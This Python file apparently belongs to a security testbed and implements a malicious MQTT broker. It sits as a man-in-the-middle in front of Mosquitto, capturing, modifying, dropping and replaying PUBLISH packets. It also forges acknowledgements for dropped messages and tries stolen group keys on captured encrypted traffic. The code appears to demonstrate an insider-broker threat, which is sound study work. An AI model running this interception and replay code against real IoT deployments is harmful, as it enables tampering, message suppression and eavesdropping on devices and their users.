"""The evil broker: an MQTT man-in-the-middle in front of stock Mosquitto.

It plays the broker operator, so it terminates client TLS with the broker's own
certificate, then forwards to Mosquitto over mTLS as 'evil-proxy'. With no rule
armed it is a transparent pass-through. Armed rules read, modify, redirect,
drop and replay PUBLISH packets.
"""

from __future__ import annotations

import asyncio
import os
import ssl
import threading
from contextlib import suppress

from evilbroker.rules import Capture, CaptureStore, Rules
from evilbroker.wire import (
    CONNECT,
    PUBLISH,
    MalformedPacket,
    PacketReader,
    connect_protocol_level,
    encode_puback,
    encode_publish,
    packet_type,
    parse_publish,
)
from securelib.config import Config
from securelib.log import get_logger
from securelib.mqtt import make_client
from securelib.tls import client_paths

log = get_logger("evil-broker")


def server_context(cfg: Config) -> ssl.SSLContext:
    p = client_paths(cfg.tls_dir, "broker")  # the evil broker IS the broker operator
    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH, cafile=str(p.ca))
    ctx.load_cert_chain(p.cert, p.key)
    ctx.verify_mode = ssl.CERT_REQUIRED
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    return ctx


def upstream_context(cfg: Config) -> ssl.SSLContext:
    p = client_paths(cfg.tls_dir, "evil-proxy")
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=str(p.ca))
    ctx.load_cert_chain(p.cert, p.key)
    return ctx


def _peer_cn(writer: asyncio.StreamWriter) -> str:
    cert = writer.get_extra_info("peercert") or {}
    for rdn in cert.get("subject", ()):
        for key, value in rdn:
            if key == "commonName":
                return value
    return "?"


class EvilBroker:
    def __init__(self, cfg: Config) -> None:
        self.cfg = cfg
        self.rules = Rules()
        self.captures = CaptureStore()
        self.loot: dict[tuple[str, int], bytes] = {}  # (source, epoch) -> stolen key, never served
        self.loot_from: dict[str, set[int]] = {}  # who/what it was stolen from -> epochs
        self.stats = {"connections": 0, "forwarded": 0, "dropped": 0, "modified": 0, "injected": 0}
        self._lock = threading.Lock()
        self._injector = None

    # --- injection (replay) ------------------------------------------------

    def start_injector(self) -> None:
        client = make_client(self.cfg, "evil-proxy")
        client.reconnect_delay_set(1, 5)
        client.connect_async(self.cfg.mosquitto_host, self.cfg.mosquitto_port, keepalive=30)
        client.loop_start()
        self._injector = client

    def inject(self, cap: Capture) -> None:
        if self._injector is None:
            raise RuntimeError("injector not started")
        self._injector.publish(cap.topic, cap.payload, qos=1, retain=False)
        with self._lock:
            self.stats["injected"] += 1
        log.info(
            f"☠ REPLAYED capture #{cap.id} on {cap.topic} "
            f"({len(cap.payload)} bytes, seq={cap.seq}, originally from {cap.client})"
        )

    def collect_loot(self) -> None:
        with self._lock:
            for dev, m in self.rules.mitm.items():
                for epoch, key in m.learned.items():
                    self.loot[("kdc", epoch)] = key
                    self.loot_from.setdefault(dev, set()).add(epoch)

    def add_loot(self, source: str, epoch: int, key: bytes, origin: str) -> None:
        """Keys handed over by another compromised component (e.g. the KDC)."""
        with self._lock:
            self.loot[(source, epoch)] = key
            self.loot_from.setdefault(origin, set()).add(epoch)
        log.info(f"☠ received a {source.upper()} epoch-{epoch} group key from {origin}")

    def _sealed_captures(self, limit: int = 30, after_id: int = 0):
        from securelib.message import peek_header

        out = []
        for cap in reversed(self.captures.find()):
            if cap.id <= after_id:
                break
            h = peek_header(cap.payload) if cap.payload[:1] == b"\x01" else None
            if h is not None:
                out.append((cap, h))
            if len(out) >= limit:
                break
        return out

    def decrypt_with_loot(self, candidates: list[bytes] | None = None, after_id: int = 0) -> dict:
        """Try every stolen key (and any extra candidate values) on the newest sealed
        captures. Returns metadata only (topic, sender, field names) — never values."""
        import json as _json

        from cryptography.exceptions import InvalidTag

        from securelib.message import decrypt_unchecked

        self.collect_loot()
        sealed = self._sealed_captures(after_id=after_id)
        tried = 0
        for cap, h in sealed:
            keys = [k for (src, ep), k in self.loot.items() if src == h.source and ep == h.epoch]
            keys += candidates or []
            for key in keys:
                tried += 1
                try:
                    body = _json.loads(decrypt_unchecked(cap.topic, cap.payload, key))
                except (InvalidTag, ValueError):
                    continue
                log.info(
                    f"☠ decrypted capture #{cap.id} on {cap.topic} "
                    f"({h.source}-epoch {h.epoch}) with a stolen key"
                )
                return {
                    "decrypted": True,
                    "capture": cap.id,
                    "topic": cap.topic,
                    "sender": h.sender,
                    "source": h.source,
                    "epoch": h.epoch,
                    "fields": sorted(body) if isinstance(body, dict) else [],
                    "tried": tried,
                    "messages": len(sealed),
                }
        log.info(f"stolen material opened none of {len(sealed)} sealed captures ({tried} tries)")
        return {"decrypted": False, "tried": tried, "messages": len(sealed)}

    def reset(self) -> None:
        with self._lock:
            self.rules.clear()
            self.captures.clear()
            self.loot.clear()
            self.loot_from.clear()
        log.info("rules cleared, captures cleared")

    # --- proxying ------------------------------------------------------------

    async def handle(self, c_reader: asyncio.StreamReader, c_writer: asyncio.StreamWriter) -> None:
        cn = _peer_cn(c_writer)
        peer = c_writer.get_extra_info("peername")
        try:
            u_reader, u_writer = await asyncio.open_connection(
                self.cfg.mosquitto_host,
                self.cfg.mosquitto_port,
                ssl=upstream_context(self.cfg),
                server_hostname="broker",
            )
        except OSError as exc:
            log.info(f"upstream Mosquitto unreachable for {cn}: {exc}")
            c_writer.close()
            return
        with self._lock:
            self.stats["connections"] += 1
        log.info(f"client '{cn}' connected from {peer[0] if peer else '?'}")
        session = {"v5": False}

        async def client_to_broker() -> None:
            reader = PacketReader()
            while data := await c_reader.read(65536):
                for raw in reader.feed(data):
                    out = self._on_client_packet(cn, raw, session, c_writer)
                    if out:
                        u_writer.write(out)
                await u_writer.drain()

        async def broker_to_client() -> None:
            while data := await u_reader.read(65536):
                c_writer.write(data)
                await c_writer.drain()

        tasks = [asyncio.create_task(client_to_broker()), asyncio.create_task(broker_to_client())]
        try:
            _, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            for t in pending:
                t.cancel()
            for t in tasks:
                with suppress(asyncio.CancelledError, OSError, ssl.SSLError, MalformedPacket):
                    await t
        finally:
            for w in (u_writer, c_writer):
                w.close()
            log.info(f"client '{cn}' disconnected")

    def _on_client_packet(
        self, cn: str, raw: bytes, session: dict, c_writer: asyncio.StreamWriter
    ) -> bytes | None:
        kind = packet_type(raw)
        if kind == CONNECT:
            session["v5"] = connect_protocol_level(raw) == 5
            return raw
        if kind != PUBLISH:
            return raw

        v5 = session["v5"]
        pub = parse_publish(raw, v5)
        cap = self.captures.add(cn, pub)
        with self._lock:
            forwarded, note = self.rules.apply(pub)

        if forwarded is None:
            # Silent drop: ack the sender ourselves so it believes delivery happened.
            if pub.qos == 1 and pub.packet_id is not None:
                c_writer.write(encode_puback(pub.packet_id))
            with self._lock:
                self.stats["dropped"] += 1
            log.info(f"☠ #{cap.id} {note} from '{cn}' ({len(pub.payload)} bytes) — sender acked")
            return None

        with self._lock:
            self.stats["forwarded"] += 1
            if note:
                self.stats["modified"] += 1
        if note:
            log.info(f"☠ #{cap.id} {note} (from '{cn}')")
            return encode_publish(forwarded, v5)
        return raw


async def serve(cfg: Config) -> None:
    import uvicorn

    from evilbroker.control import create_app

    broker = EvilBroker(cfg)
    broker.start_injector()

    listen_host = os.environ.get("BBIOT_PROXY_LISTEN", "127.0.0.1")
    server = await asyncio.start_server(
        broker.handle, listen_host, cfg.broker_port, ssl=server_context(cfg)
    )
    log.info(
        f"listening on {listen_host}:{cfg.broker_port} (mTLS), "
        f"forwarding to Mosquitto {cfg.mosquitto_host}:{cfg.mosquitto_port}; no attacks armed"
    )
    control = uvicorn.Server(
        uvicorn.Config(
            create_app(cfg, broker),
            host=listen_host,
            port=cfg.proxy_port,
            log_level="warning",
        )
    )
    log.info(f"control API on {listen_host}:{cfg.proxy_port}")
    async with server:
        await asyncio.gather(server.serve_forever(), control.serve())
